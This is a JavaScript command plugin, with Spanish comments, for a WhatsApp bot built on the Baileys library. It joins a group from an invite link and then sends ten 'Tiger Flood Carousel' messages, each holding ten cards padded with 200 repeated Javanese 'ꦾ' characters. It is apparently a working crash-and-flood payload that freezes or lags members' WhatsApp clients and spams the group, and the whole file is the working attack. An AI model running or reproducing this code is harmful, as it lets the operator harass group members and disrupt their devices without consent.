import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn, args, usedPrefix, command }) => {
  let link = args[0];
  if (!link || !link.includes('chat.whatsapp.com')) {
    return m.reply(`*Uso correcto:*\n${usedPrefix + command} https://chat.whatsapp.com/xxxxxxxxxxxxxxxx`);
  }

  // Extraer el código del link
  let code = link.split('https://chat.whatsapp.com/')[1].split('?')[0];

  try {
    // Unirse al grupo
    let groupJid = await conn.groupAcceptInvite(code);
    await m.reply(`✅ Me uní al grupo: ${groupJid}`);

    // Enviar el carrusel 10 veces
    for (let i = 0; i < 10; i++) {
      await sendSafeCarousel(groupJid, conn);
    }

  } catch (e) {
    console.error(e);
    m.reply('❌ No pude unirme al grupo o enviar el carrusel.');
  }
};
handler.command = /^caroui$/i;
export default handler;

// 🎠 Función para construir y enviar el carrusel sin romper encoding
async function sendSafeCarousel(jid, conn) {
  let cards = [];

  for (let i = 0; i < 10; i++) {
    cards.push({
      body: {
        text: "CikssXyz " + "ꦾ".repeat(200)
      },
      footer: {
        text: "🌀 Don't Panic"
      },
      header: {
        hasMediaAttachment: false
      },
      nativeFlowMessage: {
        buttons: [] // Puedes agregar botones si deseas
      }
    });
  }

  try {
    const message = generateWAMessageFromContent(jid, {
      interactiveMessage: {
        body: {
          text: "🌪️ Tiger Flood Carousel"
        },
        footer: {
          text: "⚠️ Uso experimental ⚠️"
        },
        header: {
          hasMediaAttachment: false
        },
        carouselMessage: {
          cards
        }
      }
    }, {});

    await conn.relayMessage(jid, message.message, {
      messageId: message.key.id
    });

    console.log("✅ Carousel enviado");
  } catch (err) {
    console.error("❌ Error al enviar carousel:", err);
  }
}